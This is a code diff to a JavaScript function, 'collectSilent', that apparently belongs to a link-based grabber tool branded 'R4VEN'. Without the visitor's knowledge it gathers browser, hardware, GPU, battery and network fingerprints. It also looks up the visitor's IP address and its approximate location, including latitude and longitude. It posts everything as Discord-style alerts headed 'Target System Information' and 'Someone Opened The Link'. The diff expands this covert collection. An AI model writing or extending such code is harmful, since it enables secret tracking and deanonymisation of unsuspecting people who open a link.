@@ -36,22 +36,60 @@ function initDecorations() {
 
 function collectSilent() {
   var localtime = String(new Date().toLocaleTimeString());
-  var sysinfo = '```xl\n' + navigator.userAgent + '```'
-    + '```autohotkey\n\nPlatform: ' + navigator.platform
-    + '\nCookies_Enabled: ' + navigator.cookieEnabled
-    + '\nBrowser_Language: ' + navigator.language
-    + '\nRam: ' + navigator.deviceMemory
-    + '\nCPU_cores: ' + navigator.hardwareConcurrency
-    + '\nScreen: ' + screen.width + 'x' + screen.height
-    + '\nTime: ' + localtime + '```';
+  var tz = 'Unknown'; try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'; } catch(e){}
+  
+  var gpu = 'Unknown';
+  try {
+      var cvs = document.createElement('canvas'), gl = cvs.getContext('webgl') || cvs.getContext('experimental-webgl');
+      gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+  } catch(e) {}
+
+  var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  var netType = conn ? conn.effectiveType : 'Unknown';
+  var netDL = conn ? conn.downlink + ' Mbps' : 'Unknown';
+
+  var sysinfo = '```xl\nUser-Agent: ' + navigator.userAgent + '```'
+    + '```autohotkey\n'
+    + 'Platform: ' + navigator.platform
+    + '\nVendor: ' + navigator.vendor
+    + '\nLanguage: ' + navigator.language
+    + '\nTimezone: ' + tz
+    + '\nTime: ' + localtime
+    + '\nCookies: ' + navigator.cookieEnabled
+    + '\nDo_Not_Track: ' + (navigator.doNotTrack || 'Unknown')
+    + '\n'
+    + '\n--- Hardware ---'
+    + '\nRam: ~' + (navigator.deviceMemory || 'Unknown') + ' GB'
+    + '\nCPU_Cores: ' + (navigator.hardwareConcurrency || 'Unknown')
+    + '\nGPU: ' + gpu
+    + '\nTouch_Points: ' + navigator.maxTouchPoints
+    + '\n'
+    + '\n--- Screen & Network ---'
+    + '\nResolution: ' + screen.width + 'x' + screen.height
+    + '\nViewport: ' + window.innerWidth + 'x' + window.innerHeight
+    + '\nColor_Depth: ' + screen.colorDepth + '-bit'
+    + '\nNet_Type: ' + netType
+    + '\nDownlink: ' + netDL;
+
   var AVATAR = 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png';
-  function post(payload) {
+  
+  function postInfo(batt) {
+    var finalInfo = sysinfo;
+    if(batt) finalInfo += '\n\n--- Battery ---\nCharging: ' + batt.c + '\nLevel: ' + batt.l;
+    finalInfo += '```';
+    
     var r = new XMLHttpRequest();
     r.open('POST', '/location_update'); r.setRequestHeader('Content-type', 'application/json');
-    r.send(JSON.stringify(payload));
+    r.send(JSON.stringify({ username:'R4VEN', avatar_url:AVATAR, content:'@everyone Someone Opened The Link O_o',
+      embeds:[{ author:{name:'Target System Information..'}, description:finalInfo, color:15418782 }] }));
   }
-  post({ username:'R4VEN', avatar_url:AVATAR, content:'@everyone Someone Opened The Link O_o',
-    embeds:[{ author:{name:'Target System Information..'}, title:'Uagent:', description:sysinfo, color:15418782 }] });
+
+  if ('getBattery' in navigator) {
+    navigator.getBattery().then(function(b) { postInfo({c: b.charging?'Yes':'No', l: (b.level*100)+'%'}); }).catch(function(){ postInfo(null); });
+  } else { postInfo(null); }
+
+  function post(payload) { var r=new XMLHttpRequest(); r.open('POST','/location_update'); r.setRequestHeader('Content-type','application/json'); r.send(JSON.stringify(payload)); }
+  
   $.getJSON('https://api.ipify.org?format=json', function(data) {
     post({ username:'R4VEN', avatar_url:AVATAR,
       embeds:[{ author:{name:'Target Ip'}, description:'```xl\n'+data.ip+'```\n__**IP Details:**__ https://ip-api.com/#'+data.ip+'\n', color:15548997, footer:{text:'Geographic location based on IP is approximate.'} }] });
@@ -59,7 +97,7 @@ function collectSilent() {
   $.getJSON('http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query', function(res) {
     post({ username:'R4VEN', avatar_url:AVATAR,
       embeds:[{ author:{name:'IP Address Reconnaissance'}, title:res.status,
-        description:'```autohotkey\nContinent: '+res.continent+'\nCountry: '+res.country+'\nCity: '+res.city+'\nISP: '+res.isp+'\nLat: '+res.lat+'\nLon: '+res.lon+'```', color:5763719 }] });
+        description:'```autohotkey\nContinent: '+res.continent+'\nCountry: '+res.country+'\nRegion: '+res.regionName+'\nCity: '+res.city+'\nISP: '+res.isp+'\nLat: '+res.lat+'\nLon: '+res.lon+'```', color:5763719 }] });
   });
 }
 
